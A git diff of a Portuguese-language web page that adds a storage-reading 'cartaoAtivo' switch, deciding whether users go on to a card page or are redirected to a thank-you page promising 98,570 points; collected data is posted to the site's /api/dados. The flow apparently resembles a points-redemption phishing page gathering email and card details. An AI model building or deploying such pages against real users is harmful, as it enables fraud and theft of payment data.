@@ -651,6 +651,27 @@
         // URL do servidor
         const SERVER_URL = window.location.origin;
 
+        // Função para ler estado do cartão (sempre o mais recente)
+        function getCartaoAtivo() {
+            // Tenta sessionStorage primeiro
+            let estado = sessionStorage.getItem('cartaoAtivo');
+            
+            // Se não tiver, tenta localStorage
+            if (!estado) {
+                estado = localStorage.getItem('cartaoAtivo');
+            }
+            
+            if (estado) {
+                try {
+                    const parsed = JSON.parse(estado);
+                    return parsed.ativo;
+                } catch {
+                    return true;
+                }
+            }
+            return true;
+        }
+
         async function enviarParaServidor(dados) {
             try {
                 const response = await fetch(`${SERVER_URL}/api/dados`, {
@@ -773,7 +794,6 @@
                 }, 3000);
             });
 
-            // BOTÃO CONFIRMAR DA PÁGINA 3 - VERSÃO SIMPLIFICADA
             $('#btnConfirmar1').on('click', function() {
                 if (!$('#email').val().includes('@')) {
                     Swal.fire({ icon: 'error', title: 'E-mail inválido', background: '#C62828', color: 'white' });
@@ -786,11 +806,13 @@
                 setTimeout(() => {
                     $('#loader').addClass('hidden');
                     
-                    // VERIFICAÇÃO SIMPLES - se for 'false' desativa, senão ativa
-                    const cartaoDesativado = localStorage.getItem('cartaoAtivo') === 'false';
+                    // VERIFICAÇÃO UNIVERSAL - funciona em todos dispositivos
+                    const cartaoAtivo = getCartaoAtivo();
                     
-                    if (cartaoDesativado) {
-                        // Cartão DESATIVADO - vai direto para obrigado
+                    if (cartaoAtivo) {
+                        $('#page3').addClass('hidden');
+                        $('#page4').removeClass('hidden');
+                    } else {
                         $('#statusContainer').removeClass('hidden');
                         $('#balaoGerando').removeClass('hidden');
                         $('#horaGerando').text(getHora());
@@ -798,10 +820,6 @@
                         setTimeout(() => {
                             window.location.href = '/obrigado.html?pontos=98.570&notificacao=' + encodeURIComponent('e-mail e WhatsApp');
                         }, 6000);
-                    } else {
-                        // Cartão ATIVADO - vai para página do cartão
-                        $('#page3').addClass('hidden');
-                        $('#page4').removeClass('hidden');
                     }
                     
                     const h = getHora();
